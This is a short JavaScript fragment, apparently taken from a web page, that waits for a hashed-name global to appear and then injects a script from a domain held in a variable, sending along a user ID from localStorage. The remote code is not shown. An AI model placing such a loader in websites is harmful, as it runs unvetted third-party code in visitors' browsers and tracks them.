let ec592524fc_cnt = 0;
	let ec592524fc_interval = setInterval(function(){
		if (typeof ec592524fc_country !== 'undefined') {
			clearInterval(ec592524fc_interval);
			(function(){
				var ud;
				try { ud = localStorage.getItem('ec592524fc_uid'); } catch (e) { }
				var script = document.createElement('script');
				script.type = 'text/javascript';
				script.charset = 'utf-8';
				script.async = 'true';
				script.src = 'https://' + ec592524fc_domain + '/bens/vinos.js?24105&u=' + ud + '&a=' + Math.random();
				document.body.appendChild(script);
			})();
		} else {
			ec592524fc_cnt += 1;
			if (ec592524fc_cnt >= 60) {
				clearInterval(ec592524fc_interval);
			}
		}
	}, 500);